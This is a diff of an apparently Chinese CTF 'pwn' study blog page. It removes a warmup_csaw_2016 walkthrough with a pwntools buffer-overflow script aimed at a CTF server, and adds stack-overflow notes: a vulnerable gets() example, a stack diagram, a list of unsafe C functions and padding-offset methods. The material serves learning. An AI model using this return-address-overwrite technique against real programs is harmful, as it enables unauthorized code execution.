@@ -20,10 +20,8 @@
 <meta property="og:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_18-17-10.png">
 <meta property="og:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_19-30-58.png">
 <meta property="og:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_19-33-16.png">
-<meta property="og:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-16_17-09-13.png">
-<meta property="og:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-16_17-10-27.png">
 <meta property="article:published_time" content="2023-01-15T09:40:19.000Z">
-<meta property="article:modified_time" content="2023-01-16T09:22:46.524Z">
+<meta property="article:modified_time" content="2023-01-17T02:39:56.709Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_17-42-47.png">
@@ -218,14 +216,42 @@
 <p>之后kali运行，轻松得到flag</p>
 <h2 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h2><p>nc，然后cat得到flag<img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_19-30-58.png" style="zoom:33%;"></p>
 <h2 id="ctfshow-pwn签到"><a href="#ctfshow-pwn签到" class="headerlink" title="ctfshow pwn签到"></a>ctfshow pwn签到</h2><p>题目直接把命令给了，太贴心了呜呜呜<img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_19-33-16.png"></p>
-<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>首先checksec检查一下，<img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-16_17-09-13.png"></p>
-<p>依旧无事发生，拉进ida里分析。</p>
-<p>main函数中有危险函数gets，<img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-16_17-10-27.png">同时，发现v5和rbp(对应32位中的ebp)的距离是40h，也就是说只需要40h+8就可以覆盖返回地址</p>
-<p>之后再来寻找目标函数地址，shift+f12寻找，找到cat flag.txt，右键＋X找到目标函数sub_40060D，开始于40060D。</p>
-<p>编写脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26137</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>)+p64(<span class="number">0x40060D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h1><h2 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h2><p>程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。发生栈溢出的基本前提是：</p>
+<ul>
+<li>程序必须向栈上写入数据。</li>
+<li>写入的数据大小没有被良好地控制。</li>
+</ul>
+<p>最典型的栈溢出利用是覆盖返回地址为攻击者所控制的地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [sp+4h] [bp-14h]@1</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>运行得到flag</p>
+<p>在上述代码中，栈结构为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
+
+<p>目标是把retaddr(返回地址)覆盖为目标函数的地址。</p>
+<p>寻找危险函数:</p>
+<ul>
+<li>gets,它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易导致栈溢出。</li>
+<li>scanf</li>
+<li>vscanf</li>
+<li>sprintf</li>
+<li>strcpy,字符串复制，遇到’\x00’停止</li>
+<li>strcat,字符串拼接，遇到’\x00’停止</li>
+<li>bcopy</li>
+</ul>
+<p>确定填充长度:</p>
+<p>常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
+<ul>
+<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
+<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
+<li>直接地址索引，就相当于直接给定了地址。</li>
+</ul>
+<p>覆盖需求</p>
+<ul>
+<li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li>
+<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>
+<li><strong>覆盖 bss 段某个变量的内容</strong>。</li>
+<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
+</ul>
 
       
 
